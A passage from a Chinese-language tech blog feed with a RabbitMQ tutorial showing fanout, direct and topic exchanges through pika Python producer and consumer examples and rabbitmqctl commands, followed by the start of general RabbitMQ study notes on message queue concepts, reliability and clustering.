<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                /--------------&gt; Queue1</span><br><span class="line">Producer ------------&gt; Exchange ---------------&gt; Queue2</span><br><span class="line">                                \--------------&gt; Queue3</span><br></pre></td></tr></table></figure>
<p>交换机有四种类型：direct, topic, fanout, headers(不常用)</p>
<p>这里使用exchange_declare声明一个fanout类型交换机, 给交换机起名为<code>logs</code>。 fanout类型交换机很容易理解，就是把所有消息广播给这个交换机”认识”的所有队列。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">channel.exchange_declare(exchange=&#x27;logs&#x27;, exchange_type=&#x27;fanout&#x27;)</span><br></pre></td></tr></table></figure>
<p>修改basic_publish的exchange参数, 把消息发送到fanout交换机上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">channel.basic_publish(exchange=&#x27;logs&#x27;, routing_key=&#x27;&#x27;, body=message)</span><br></pre></td></tr></table></figure>
<p>使用如下命令查看交换机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rabbitmqctl list_exchanges</span><br></pre></td></tr></table></figure>
<h3><span id="temporary-queues临时队列">Temporary Queues(临时队列)</span></h3><p>如下方法创建一个临时队列</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">result = channel.queue_declare(queue=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># result.method.queue包含一个随机的队列名，例如:`amq.gen-JzTY20BRgKO-HjmUJj0wLg`</span></span><br></pre></td></tr></table></figure>
<p>这个例子中，我们希望当消费者连接断开时, 队列随即被删除。 需要在声明临时队列时指定exclusive参数为True</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">result = channel.queue_declare(queue=<span class="string">&#x27;&#x27;</span>, exclusive=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<h3><span id="bindings绑定交换机和队列">Bindings(绑定交换机和队列)</span></h3><p>我们创建了一个fanout交换机和一个队列。现在需要让交换机发送消息给队列。 这种交换机和队列之间的关系叫做绑定(Binding)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Producer ----------&gt; Exchange -------binding -------&gt; Queue1</span><br><span class="line">                             \-------binding -------&gt; Queue2</span><br></pre></td></tr></table></figure>
<p>使用queue_bind方法，把交换机和队列绑定</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">channel.queue_bind(exchange=<span class="string">&#x27;logs&#x27;</span>, queue=result.method.queue)</span><br></pre></td></tr></table></figure>
<p>使用如下命令查看绑定</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rabbitmqctl list_bindings</span><br></pre></td></tr></table></figure>

<p>完整的生产者代码(emit_log.py)如下:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(host=<span class="string">&#x27;localhost&#x27;</span>))</span><br><span class="line">channel = connection.channel()</span><br><span class="line"></span><br><span class="line">channel.exchange_declare(exchange=<span class="string">&#x27;logs&#x27;</span>, exchange_type=<span class="string">&#x27;fanout&#x27;</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="string">&#x27; &#x27;</span>.join(sys.argv[<span class="number">1</span>:]) <span class="keyword">or</span> <span class="string">&quot;info: Hello World!&quot;</span></span><br><span class="line">channel.basic_publish(exchange=<span class="string">&#x27;logs&#x27;</span>, routing_key=<span class="string">&#x27;&#x27;</span>, body=message)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot; [x] Sent <span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line">connection.close()</span><br></pre></td></tr></table></figure>
<p>注: basic_publish中需要指定routing_key, 这里指定为空即可, fanout类型交换机会忽略routing_key的值</p>
<p>完整的消费者代码(receive_logs.py)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import pika</span><br><span class="line"></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(host=&#x27;localhost&#x27;))</span><br><span class="line">channel = connection.channel()</span><br><span class="line"></span><br><span class="line">channel.exchange_declare(exchange=&#x27;logs&#x27;, exchange_type=&#x27;fanout&#x27;)</span><br><span class="line"></span><br><span class="line">result = channel.queue_declare(queue=&#x27;&#x27;, exclusive=True)</span><br><span class="line">queue_name = result.method.queue</span><br><span class="line"></span><br><span class="line">channel.queue_bind(exchange=&#x27;logs&#x27;, queue=queue_name)</span><br><span class="line"></span><br><span class="line">print(&#x27; [*] Waiting for logs. To exit press CTRL+C&#x27;)</span><br><span class="line"></span><br><span class="line">def callback(ch, method, properties, body):</span><br><span class="line">    print(f&quot; [x] &#123;body&#125;&quot;)</span><br><span class="line"></span><br><span class="line">channel.basic_consume(</span><br><span class="line">    queue=queue_name, on_message_callback=callback, auto_ack=True)</span><br><span class="line"></span><br><span class="line">channel.start_consuming()</span><br></pre></td></tr></table></figure>
<p>开多个窗口，启动多个消费者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[consumer 1 to n]</span><br><span class="line">python receive_logs.py</span><br></pre></td></tr></table></figure>
<p>启动生产者，发送日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python emit_log.py</span><br><span class="line"> [x] Sent info: Hello World!</span><br></pre></td></tr></table></figure>

<p>查看所有消费者都收到了同样的日志消息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[consumer 1 to n]</span><br><span class="line"># python3 receive_logs.py</span><br><span class="line"> [*] Waiting for logs. To exit press CTRL+C</span><br><span class="line"> [x] b&#x27;info: Hello World!&#x27;</span><br><span class="line"> [x] b&#x27;info: Hello World!&#x27;</span><br></pre></td></tr></table></figure>
<p>查看创建的交换机, 队列, 和绑定信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># rabbitmqctl list_exchanges</span><br><span class="line">Listing exchanges for vhost / ...</span><br><span class="line">name    type</span><br><span class="line">logs    fanout</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"># rabbitmqctl list_queues</span><br><span class="line">Listing queues for vhost / ...</span><br><span class="line">name    messages</span><br><span class="line">amq.gen-CbtKVwLyav93M0cG0hBDZg  0</span><br><span class="line"></span><br><span class="line"># rabbitmqctl list_bindings</span><br><span class="line">Listing bindings for vhost /...</span><br><span class="line">source_name     source_kind     destination_name        destination_kind        routing_key     arguments</span><br><span class="line">logs    exchange        amq.gen-CbtKVwLyav93M0cG0hBDZg  queue   amq.gen-CbtKVwLyav93M0cG0hBDZg  []</span><br></pre></td></tr></table></figure>

<h2><span id="3-routing路由">3. Routing(路由）</span></h2><p><a href="https://www.rabbitmq.com/tutorials/tutorial-four-python">https://www.rabbitmq.com/tutorials/tutorial-four-python</a></p>
<p>上面实现的日志系统采用了fanout类型交换机, 将所有日志广播给消费者。 这一节我们对日志系统进行扩展，根据日志严重程度过滤日志, 改用direct类型交换机。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Producer ---------&gt; direct Exchange --------key1-------&gt; Queue 1 -------&gt; Consumer 1</span><br><span class="line">                                    \</span><br><span class="line">                                     \------key2-------&gt; Queue 2 -------&gt; Consumer 2</span><br></pre></td></tr></table></figure>
<p>使用direct类型交换机, 需要在queue_bind方法中指定routing_key</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">channel.queue_bind(exchange=exchange_name, queue=queue_name, routing_key=&#x27;key1&#x27;)</span><br></pre></td></tr></table></figure>

<h3><span id="multiple-bindings">Multiple Bindings</span></h3><p>可以使用相同的routing key绑定多个队列, 例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Producer ---------&gt; direct Exchange	--------key1-------&gt; Queue 1 -------&gt; Consumer 1</span><br><span class="line">                                    \</span><br><span class="line">                                     \------key1-------&gt; Queue 2 -------&gt; Consumer 2</span><br></pre></td></tr></table></figure>
<p>此时direct交换机行为和fanout交换机类似, routing_key&#x3D;key1的消息会同时发送到Queue 1和Queue 2</p>
<p><strong>发布日志</strong><br>首先创建一个direct类型交换机，交换机名称为direct_logs</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">channel.exchange_declare(exchange=<span class="string">&#x27;direct_logs&#x27;</span>, exchange_type=<span class="string">&#x27;direct&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>使用basic_publish发送消息, routing_key表示日志等级, 取值为info, warning或error</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">channel.basic_publish(exchange=<span class="string">&#x27;direct_logs&#x27;</span>, routing_key=serverity, body=message)</span><br></pre></td></tr></table></figure>
<p><strong>订阅日志</strong><br>声明队列, 创建routing_key到队列的绑定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">result = channel.queue_declare(queue=&#x27;&#x27;, exclusive=True)</span><br><span class="line">queue_name = result.method.queue</span><br><span class="line"></span><br><span class="line">for severity in severities:</span><br><span class="line">    channel.queue_bind(exchange=&#x27;direct_logs&#x27;,queue=queue_name, routing_key=severity)</span><br></pre></td></tr></table></figure>

<p>整个发布订阅流程如下图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                   |--------------error-----------&gt; Queue 1 ---------------&gt; Consumer 1</span><br><span class="line">                                   | </span><br><span class="line">                                   |    /----------info----------\</span><br><span class="line">Producer -------------&gt; direct Exchange -----------warn-----------&gt; Queue 2 ---------------&gt; Consumer 2</span><br><span class="line">                                        \----------error---------/</span><br></pre></td></tr></table></figure>

<p>生产者(emit_log_direct.py)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(host=<span class="string">&#x27;localhost&#x27;</span>))</span><br><span class="line">channel = connection.channel()</span><br><span class="line"></span><br><span class="line">channel.exchange_declare(exchange=<span class="string">&#x27;direct_logs&#x27;</span>, exchange_type=<span class="string">&#x27;direct&#x27;</span>)</span><br><span class="line"></span><br><span class="line">severity = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&#x27;info&#x27;</span></span><br><span class="line">message = <span class="string">&#x27; &#x27;</span>.join(sys.argv[<span class="number">2</span>:]) <span class="keyword">or</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line">channel.basic_publish(exchange=<span class="string">&#x27;direct_logs&#x27;</span>, routing_key=severity, body=message)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot; [x] Sent <span class="subst">&#123;severity&#125;</span>:<span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line">connection.close()</span><br></pre></td></tr></table></figure>
<p>消费者(receive_logs_direct.py)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(host=<span class="string">&#x27;localhost&#x27;</span>))</span><br><span class="line">channel = connection.channel()</span><br><span class="line"></span><br><span class="line">channel.exchange_declare(exchange=<span class="string">&#x27;direct_logs&#x27;</span>, exchange_type=<span class="string">&#x27;direct&#x27;</span>)</span><br><span class="line"></span><br><span class="line">result = channel.queue_declare(queue=<span class="string">&#x27;&#x27;</span>, exclusive=<span class="literal">True</span>)</span><br><span class="line">queue_name = result.method.queue</span><br><span class="line"></span><br><span class="line">severities = sys.argv[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> severities:</span><br><span class="line">    sys.stderr.write(<span class="string">&quot;Usage: %s [info] [warning] [error]\n&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> severity <span class="keyword">in</span> severities:</span><br><span class="line">    channel.queue_bind(</span><br><span class="line">        exchange=<span class="string">&#x27;direct_logs&#x27;</span>, queue=queue_name, routing_key=severity)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; [*] Waiting for logs. To exit press CTRL+C&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback</span>(<span class="params">ch, method, properties, body</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot; [x] <span class="subst">&#123;method.routing_key&#125;</span>:<span class="subst">&#123;body&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">channel.basic_consume(queue=queue_name, on_message_callback=callback, auto_ack=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">channel.start_consuming()</span><br></pre></td></tr></table></figure>

<p>启动第一个消费者，只订阅warning和error等级的日志, 存储到磁盘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python receive_logs_direct.py warning error &gt; logs_from_rabbit.log</span><br></pre></td></tr></table></figure>
<p>启动第二一个消费者，订阅所有等级的日志，打印到终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python receive_logs_direct.py info warning error</span><br></pre></td></tr></table></figure>
<p>最后，启动一个生产者，依次发送error, warning, info等级日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python emit_log_direct.py error &quot;Run. Run. Or it will explode.&quot;</span><br><span class="line"> [x] Sent error:Run. Run. Or it will explode.</span><br><span class="line">[root@k8s-node2 04_routing]# python emit_log_direct.py warning &quot;warning message&quot;</span><br><span class="line"> [x] Sent warning:warning message</span><br><span class="line">[root@k8s-node2 04_routing]# python emit_log_direct.py info &quot;info message&quot;</span><br><span class="line"> [x] Sent info:info message</span><br></pre></td></tr></table></figure>
<p>查看消费情况。 第一个消费者只保存了error和warning日志到文件，第二个消费者打印了所有日志等级的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Consumer 1</span><br><span class="line"># python receive_logs_direct.py warning error &gt; logs_from_rabbit.log</span><br><span class="line">^CKeyboardInterrupt</span><br><span class="line"># cat logs_from_rabbit.log</span><br><span class="line"> [*] Waiting for logs. To exit press CTRL+C</span><br><span class="line"> [x] error:b&#x27;Run. Run. Or it will explode.&#x27;</span><br><span class="line"> [x] warning:b&#x27;warning message&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Consumer 2</span><br><span class="line"># python receive_logs_direct.py info warning error</span><br><span class="line"> [*] Waiting for logs. To exit press CTRL+C</span><br><span class="line"> [x] error:b&#x27;Run. Run. Or it will explode.&#x27;</span><br><span class="line"> [x] warning:b&#x27;warning message&#x27;</span><br><span class="line"> [x] info:b&#x27;info message&#x27;</span><br></pre></td></tr></table></figure>

<h2><span id="4-topic类型交换机">4. Topic类型交换机</span></h2><p>Topic类型交换机将路由键与某个模式匹配，生产者带routingKey, 消费者带模糊的routingKey</p>
<ul>
<li><code>*</code>正好匹配一个词，比如<code>order.*</code>匹配<code>order.insert</code></li>
<li><code>#</code>匹配一个或多个词，比如<code>order.#</code>匹配<code>order.insert.common</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                    /----------kern.*---------&gt; Queue1 ----------&gt; Customer 1</span><br><span class="line">Producer ---------&gt; Exchange(Topic)</span><br><span class="line">                                    \--------*.critical-------&gt; Queue2 ----------&gt; Customer 2</span><br></pre></td></tr></table></figure>

<p>生产者(emit_log_topic.py)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(host=<span class="string">&#x27;localhost&#x27;</span>))</span><br><span class="line">channel = connection.channel()</span><br><span class="line"></span><br><span class="line">channel.exchange_declare(exchange=<span class="string">&#x27;topic_logs&#x27;</span>, exchange_type=<span class="string">&#x27;topic&#x27;</span>)</span><br><span class="line"></span><br><span class="line">routing_key = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="string">&#x27;anonymous.info&#x27;</span></span><br><span class="line">message = <span class="string">&#x27; &#x27;</span>.join(sys.argv[<span class="number">2</span>:]) <span class="keyword">or</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line">channel.basic_publish(</span><br><span class="line">    exchange=<span class="string">&#x27;topic_logs&#x27;</span>, routing_key=routing_key, body=message)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot; [x] Sent <span class="subst">&#123;routing_key&#125;</span>:<span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line">connection.close()</span><br></pre></td></tr></table></figure>
<p>消费者(receive_logs_topic.py)</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> pika</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(host=<span class="string">&#x27;localhost&#x27;</span>))</span><br><span class="line">channel = connection.channel()</span><br><span class="line"></span><br><span class="line">channel.exchange_declare(exchange=<span class="string">&#x27;topic_logs&#x27;</span>, exchange_type=<span class="string">&#x27;topic&#x27;</span>)</span><br><span class="line"></span><br><span class="line">result = channel.queue_declare(<span class="string">&#x27;&#x27;</span>, exclusive=<span class="literal">True</span>)</span><br><span class="line">queue_name = result.method.queue</span><br><span class="line"></span><br><span class="line">binding_keys = sys.argv[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> binding_keys:</span><br><span class="line">    sys.stderr.write(<span class="string">&quot;Usage: %s [binding_key]...\n&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> binding_key <span class="keyword">in</span> binding_keys:</span><br><span class="line">    channel.queue_bind(</span><br><span class="line">        exchange=<span class="string">&#x27;topic_logs&#x27;</span>, queue=queue_name, routing_key=binding_key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; [*] Waiting for logs. To exit press CTRL+C&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback</span>(<span class="params">ch, method, properties, body</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot; [x] <span class="subst">&#123;method.routing_key&#125;</span>:<span class="subst">&#123;body&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">channel.basic_consume(</span><br><span class="line">    queue=queue_name, on_message_callback=callback, auto_ack=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">channel.start_consuming()</span><br></pre></td></tr></table></figure>

<p>接收所有日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python receive_logs_topic.py &quot;#&quot;</span><br></pre></td></tr></table></figure>
<p>接收kern模块的日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python receive_logs_topic.py &quot;kern.*&quot;</span><br></pre></td></tr></table></figure>
<p>接收critical等级的日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python receive_logs_topic.py &quot;*.critical&quot;</span><br></pre></td></tr></table></figure>
<p>接收kern模块或者critical等级日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python receive_logs_topic.py &quot;kern.*&quot; &quot;*.critical&quot;</span><br></pre></td></tr></table></figure>

<p>生产者发送消息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python emit_log_topic.py &quot;kern.critical&quot; &quot;A critical kernel error&quot;</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p>【1】 <a href="https://www.rabbitmq.com/tutorials/tutorial-one-python">https://www.rabbitmq.com/tutorials/tutorial-one-python</a></p>
]]></content>
      <categories>
        <category>RabbitMQ</category>
      </categories>
      <tags>
        <tag>RabbitMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>RabbitMQ学习记录</title>
    <url>/2025/0207224807.html</url>
    <content><![CDATA[<h1><span id="什么是消息队列">什么是消息队列</span></h1><p>消息队列是在消息传输过程中保存消息的容器。 通常有生产者和消费者两个角色:</p>
<ul>
<li>生产者只负责发送数据到消息队列，谁消费他不管</li>
<li>消费者只负责从消息队列中取数据处理，谁发送数据他不管</li>
</ul>
<h1><span id="常见消息队列中间件">常见消息队列中间件</span></h1><ul>
<li>Kafka 高吞吐量, 实时日志采集</li>
<li>RabbitMQ Erlang语言, 灵活性和易用性，中小规模应用</li>
<li>RocketMQ 阿里出品, Java开发, 国内市场有很高知名度和应用案例</li>
</ul>
<h1><span id="为什么使用消息队列">为什么使用消息队列</span></h1><span id="more"></span>

<ol>
<li><p>服务解耦: 通过消息队列, 生产者和消费者之间可以不依赖对方进行通信。 即使某个组件失败，也不影响其他组件，提升可靠性。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------------------+          +------------------+         +------------------+</span><br><span class="line">|   Producer 1     |          |   Producer 2     |         |   Producer N     |</span><br><span class="line">+--------+---------+          +--------+---------+         +--------+---------+</span><br><span class="line">         |                             |                            |</span><br><span class="line">         v                             v                            v</span><br><span class="line">+------------------------------------------------------------------------------+</span><br><span class="line">|                           (Message Queue)                                    |</span><br><span class="line">+------------------------------------------------------------------------------+</span><br><span class="line">         |                             |                            |</span><br><span class="line">         v                             v                            v</span><br><span class="line">+--------+---------+          +--------+---------+          +------------------+</span><br><span class="line">|   Consumer 1     |          |   Consumer 2     |          |   Consumer M     |</span><br><span class="line">+------------------+          +------------------+          +------------------+</span><br></pre></td></tr></table></figure>
</li>
<li><p>异步处理: 生产者将请求发送到队列，无需等待请求处理(例如：用户注册发送短信验证码)。 减少响应时间，提升性能和用户体验。 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                                                                     /----------------&gt; System B(200ms)</span><br><span class="line">            Request                                                 /</span><br><span class="line">client -------------------&gt;  System A(30ms) --------&gt; Message Queue ------------------&gt; System C(300ms)</span><br><span class="line">       &lt;-------------------									        \</span><br><span class="line">			Response			  					                 \----------------&gt; System D(250ms)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>流量削峰: 面对高并发请求，通过消息队列缓冲请求，避免系统过载。 确保系统在高峰期稳定运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        10k requests/s                       consume 2k requests/s</span><br><span class="line">User --------------------&gt; Message Queue --------------------------&gt; System A --------------------&gt; MySQL</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h1><span id="消息队列的劣势">消息队列的劣势</span></h1><ul>
<li>系统可用性降低，如果MQ挂了，整个系统就崩了</li>
<li>系统复杂性增加, 需要考虑消息队列自身的可用性问题，例如：<ul>
<li>如何保证消息不被重复消费</li>
<li>如何保证消息可靠传输</li>
<li>如何保证数据一致性</li>
<li>如何解决消息积压导致的故障</li>
</ul>
</li>
</ul>
<h1><span id="不适用消息队列的场景">不适用消息队列的场景</span></h1><ul>
<li>对于简单的，快速执行的任务，直接调用API更为直接高效</li>
<li>需要立即确认结果的交互</li>
<li>…</li>
</ul>
<h1><span id="rabbitmq简介">RabbitMQ简介</span></h1><p>RabbitMQ是实现了高级消息队列协议（AMQP）的开源消息代理软件。RabbitMQ服务器是用Erlang语言编写的</p>
<h1><span id="amqp是什么">AMQP是什么</span></h1><p>Module Layer: 协议最高层，主要定义了一些客户端调用的命令，客户端可以用这些命令实现自己的业务逻辑。<br>Session Layer: 中间层，主要负责客户端命令发送给服务器，再将服务端应答返回客户端，提供可靠性同步机制和错误处理。<br>TransportLayer: 最底层，主要传输二进制数据流，提供帧的处理、信道服用、错误检测和数据表示等。</p>
<h1><span id="rabbitmq的几个概念">RabbitMQ的几个概念</span></h1><ul>
<li>Broker, RabbitMQ的服务节点，一个broker可以看做一个RabbitMQ服务器</li>
<li>Exchange(交换机）, 生产者把消息发送到交换机, 交换机负责把消息路由到队列中</li>
<li>Queue(队列), 用于存储消息。 多个消费者可以订阅同一个队列，此时队列消息会平摊(Round-Robin)给多个消费者处理</li>
</ul>
<h1><span id="routingkey的概念">RoutingKey的概念</span></h1><p>生产者将消息发送给交换机时，需要指定一个RoutingKey, 用于指定消息的路由规则。</p>
<h1><span id="binding">Binding</span></h1><p>通过绑定将交换机和队列关联起来</p>
<h1><span id="rabbitmq交换机的概念为什么设计">RabbitMQ交换机的概念，为什么设计</span></h1><p>RabbitMQ中的消息不是直接发送到队列，而是发送到交换机，由交换机发送到队列</p>
<h1><span id="rabbitmq交换机的几种类型">RabbitMQ交换机的几种类型</span></h1><ul>
<li>fanout 把消息路由到所有与交换机绑定的队列中</li>
<li>direct 消息路由到BindingKey和RoutingKey完全匹配的队列中</li>
<li>topic<ul>
<li>RoutingKey为一个点号分隔的字符串</li>
<li>BindingKey也是一个点号分隔的字符串, 可以使用*和#作模糊匹配, *匹配一个单词, #匹配0个或多个</li>
</ul>
</li>
<li>headers 不常用</li>
</ul>
<h1><span id="生产者发送消息流程">生产者发送消息流程</span></h1><ul>
<li>生产者连接到Broker, 建立连接, 开启一个信道(channel)</li>
<li>声明一个交换机</li>
<li>声明一些队列</li>
<li>通过路由键将交换机和队列绑定起来</li>
<li>生产者发送消息到Broker, 其中包含路由键(Routing Key), 交换机等信息</li>
<li>交换机根据路由键查找匹配队列，将消息存入响应队列</li>
<li>RabbitMQ收到确认，从队列中删除已确认的消息</li>
<li>关闭信道和连接</li>
</ul>
<h1><span id="消费者接受消息">消费者接受消息</span></h1><ul>
<li>消费者连接到Broker，建立连接，开启一个信道（channel)</li>
<li>向Broker请求消费队列中的消息, 设置回调函数</li>
<li>等待Broker回应，接收信息, 确认收到的消息</li>
<li>RabbitMQ收到确认，从队列中删除已确认的消息</li>
<li>关闭信道和连接</li>
</ul>
<h1><span id="交换机无法找到队列时怎么处理">交换机无法找到队列时，怎么处理</span></h1><ul>
<li>mandatory: true, 返回消息给生产者</li>
<li>mandatory: false, 直接丢弃</li>
</ul>
<h1><span id="死信队列是什么">死信队列是什么</span></h1><ul>
<li>当消息在一个队列中变成dead message之后，可以被重新发送到另一个交换机中，这个交换机就是DLX(Dead-Letter-Exchange)</li>
</ul>
<h1><span id="导致dead-message的原因">导致dead message的原因</span></h1><ul>
<li>消息被拒</li>
<li>消息TTL过期</li>
<li>队列满了，无法添加</li>
</ul>
<h1><span id="延迟队列">延迟队列</span></h1><p>当消息发送之后，并不想让消费者立刻拿到消息，而是等待特定时间后，消费者才能拿到这个消息进行消费</p>
<h1><span id="优先级队列">优先级队列</span></h1><p>优先级高的先消费，通过x-max-priority实现，当消费速度比较快，没有消息堆积情况下，这个优先级队列意义不大。</p>
<h1><span id="事物机制">事物机制</span></h1><p>RabbitMQ客户端中与事务机制相关方法:</p>
<ul>
<li>channel.txSelect 用于将当前信道设置为事务模式</li>
<li>channel.txCommit 提交事务</li>
<li>channel.txRollback 事务回滚，如果事务提交执行前抛出异常，通过txRollback回滚</li>
</ul>
<h1><span id="发送确认机制">发送确认机制</span></h1><p>生产者把信道设置为confirm模式后，所有在此channel发布消息会被指定一个唯一ID,<br>一旦消息被投递到所有匹配队列之后，RabbitMQ就会发送一个确认给生产者，这样生产者就知道消息到达对应的目的地了</p>
<h1><span id="消息传输保证的层级">消息传输保证的层级</span></h1><ul>
<li>At most once 最多一次，消息可能会丢失，但不会重复传输</li>
<li>At least once 最少一次，信息不会丢失，但可能重复传输</li>
<li>Exactly once 恰好一次，消息仅传输一次</li>
</ul>
<h1><span id="virtual-host概念">Virtual Host概念</span></h1><p>每个RabbitMQ服务器都能创建虚拟的服务器，也叫虚拟主机(vhost)</p>
<h1><span id="集群中的节点类型">集群中的节点类型</span></h1><ul>
<li>内存节点: ram, 将变更写入内存</li>
<li>磁盘节点: disc, 磁盘写入操作<br>RabbitMQ要求最少有一个磁盘节点</li>
</ul>
<h1><span id="生产者如何将消息可靠投递到mq">生产者如何将消息可靠投递到MQ</span></h1><ul>
<li>Client发送消息给MQ</li>
<li>MQ将消息持久化后, 发送Ack消息给Client, 如果说因为网络问题导致Ack无法发送到Client, Client在等待超时后会重传消息</li>
<li>Client收到ACK后，可以认为消息投递成功</li>
</ul>
<h1><span id="mq如何把消息可靠投递到消费者">MQ如何把消息可靠投递到消费者</span></h1><ul>
<li>消费者收到消息执行业务逻辑</li>
<li>发送Ack消息给MQ，通知MQ删除该消息, 此处可能因为网络问题导致ACK失败,导致重复消费，引出消费幂等问题</li>
<li>MQ将已消费消息删除</li>
</ul>
<h1><span id="rabbitmq的高可用">RabbitMQ的高可用</span></h1><ul>
<li>单机模式 —— demo, 玩具, 生产环境很少用单机</li>
<li>普通集群模式 —— 多台机器启动多个RabbitMQ示例</li>
<li>镜像集群模式 —— 高可用模式, 创建的Queue,消息会存在与多个实例上，每次写消息到Queue时，自动把消息到多个实例的Queue进行消息同步</li>
</ul>
<h1><span id="如何保证消息的顺序性">如何保证消息的顺序性</span></h1><ul>
<li>拆分多个Queue, 每个Queue对应一个Consumer</li>
</ul>
<h1><span id="如何保证消息的可靠性">如何保证消息的可靠性</span></h1><ul>
